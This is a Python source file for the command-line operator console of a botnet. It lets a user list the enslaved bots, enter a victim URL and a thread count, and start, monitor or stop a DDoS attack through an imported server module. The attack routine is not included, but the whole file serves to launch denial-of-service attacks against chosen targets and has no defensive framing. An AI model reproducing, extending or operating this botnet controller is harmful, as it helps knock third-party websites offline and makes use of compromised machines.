# Imports
from modules.connection import *
from loguru import logger
import time
import sys
import os

# Functions


def clear_console():
    if sys.platform.startswith("linux"):
        os.system('clear')
        return
    os.system('CLS')


# Initialization
logger.info('Initialization...')
try:
    server = Server()
    logger.info('Use "help" for help')
except Exception as e:
    logger.error(f'Error: {e}')
    sys.exit()

time.sleep(0.1)

# Commands listener
while True:
    command = input('~$ ').lower()
    if command == 'botnet status':
        try:
            responce = server.get_status()
        except Exception as e:
            logger.error(f'Error: {e}')
            logger.info('Server is down')
            break
        if not responce['is_attack']:
            logger.info('No active attacks')
        else:
            logger.info('One active attack')
        print()
        answer = int(input('Show bots?\n    1 - yes\n    2-no\n~$ '))
        if answer == 1:
            if len(responce['botnet']) > 0:
                logger.info('Bots:')
                print('\n'.join(responce['botnet']))
            else:
                logger.warning('Botnet is still empty')
        else:
            continue
    elif 'attack start' in command:
        target_url = input('Enter victim url: ')
        target_port = 80
        threads = int(input('Enter ddos threads: '))
        clear_console()
        logger.info('Check attack config:')
        print(f'Url: {target_url}')
        print(f'Port: 80')
        print(f'Threads: {threads}')
        answer = int(
            input('Is everything right?\n    1 - Yes\n    2 - No\n~$ '))
        if answer == 1:
            try:
                server.start_attack(target_url, target_port, threads)
                logger.success('The attack has been launched')
                print('Stop attack: stop attack')
            except Exception as e:
                logger.error(f'Error: {e}')
        else:
            continue
    elif command == 'attack stop':
        answer = int(input(
            'Are you sure you want to interrupt the attack?\n    1 - Yes\n    2 - No\n~$ '))
        if answer == 1:
            try:
                server.stop_attack()
            except Exception as e:
                logger.error(f'Error: {e}')
            logger.warning('The attack was interrupted')
        else:
            logger.info('The attack continues')
    elif command == 'attack status':
        try:
            attack_config = server.get_attack_status()
            logger.info(f"Attack running: {attack_config['running']}")
            if attack_config['running']:
                print(f"Target url: {attack_config['ddos']['target']}")
                print(f"Target port: {attack_config['ddos']['port']}")
                print(f"Threads: {attack_config['ddos']['threads']}")
        except Exception as e:
            logger.error(f'Error: {e}')

    elif 'help' in command:
        logger.info('All commands list')
        print('''
        ~$ botnet status - Get botnet status
        ~$ attack start - Start attack
        ~$ attack stop - Stop attack
        ~$ attack status - Status of attack
        ~$ cls or clear - Clear console
        ~$ help - All commands''')
    elif command == 'cls' or command == 'clear':
        clear_console()
    print()
